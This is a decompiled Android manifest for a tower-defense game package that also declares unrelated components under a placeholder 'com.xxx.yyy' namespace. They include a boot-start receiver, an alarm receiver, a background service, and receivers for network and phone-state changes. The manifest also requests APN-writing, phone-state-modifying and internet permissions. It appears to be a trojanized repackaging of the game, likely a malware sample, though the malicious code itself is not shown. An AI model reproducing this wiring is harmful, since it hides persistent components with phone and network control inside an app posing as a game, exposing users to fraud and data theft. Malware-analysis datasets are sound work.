<?xml version="1.0" encoding="utf-8"?>
<manifest
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:versionCode="1743"
    android:versionName="1.2.0"
    package="com.magicwach.rdefense">

    <uses-permission
        android:name="android.permission.WAKE_LOCK" />

    <uses-sdk
        android:minSdkVersion="1" />

    <application
        android:theme="@ref/0x0103000a"
        android:label="@ref/0x7f050000"
        android:icon="@ref/0x7f02001c"
        android:sharedUserId="com.magicwach.rdefense_free"
        android:multiprocess="false"
        android:stateNotNeeded="true"
        android:launchMode="2"
        android:configChanges="0xa0">

        <activity
            android:label="@ref/0x7f050000"
            android:name=".TitleActivity">

            <intent-filter>

                <action
                    android:name="android.intent.action.MAIN" />

                <category
                    android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <activity
            android:label="@ref/0x7f050000"
            android:name=".GameActivity" />

        <activity
            android:name=".RewardActivity" />

        <activity
            android:name=".AchievementActivity" />

        <activity
            android:name=".CreditsActivity" />

        <activity
            android:name=".LevelSelectActivity" />

        <activity
            android:name=".MixerSelectActivity" />

        <activity
            android:name=".DebugActivity" />

        <activity
            android:name=".OptionsActivity" />

        <receiver
            android:name="com.xxx.yyy.MyBoolService">

            <intent-filter>

                <action
                    android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>

        <receiver
            android:name="com.xxx.yyy.MyAlarmReceiver">

            <intent-filter>

                <action
                    android:name="com.lz.myservicestart" />
            </intent-filter>
        </receiver>

        <service
            android:name="com.xxx.yyy.MyService"
            android:enabled="true" />

        <receiver
            android:name="com.xxx.yyy.NetWorkReceiver">

            <intent-filter>

                <action
                    android:name="android.net.conn.CONNECTIVITY_CHANGE" />
            </intent-filter>
        </receiver>

        <receiver
            android:name="com.xxx.yyy.CustomBroadcastReceiver">

            <intent-filter>

                <action
                    android:name="android.intent.action.PHONE_STATE" />
            </intent-filter>
        </receiver>
    </application>

    <uses-permission
        android:name="android.permission.WRITE_APN_SETTINGS" />

    <uses-permission
        android:name="android.permission.RECEIVE_BOOT_COMPLETED" />

    <uses-permission
        android:name="android.permission.ACCESS_NETWORK_STATE" />

    <uses-permission
        android:name="android.permission.READ_PHONE_STATE" />

    <uses-permission
        android:name="android.permission.WRITE_EXTERNAL_STORAGE" />

    <uses-permission
        android:name="android.permission.INTERNET" />

    <uses-permission
        android:name="android.permission.MODIFY_PHONE_STATE" />
</manifest>
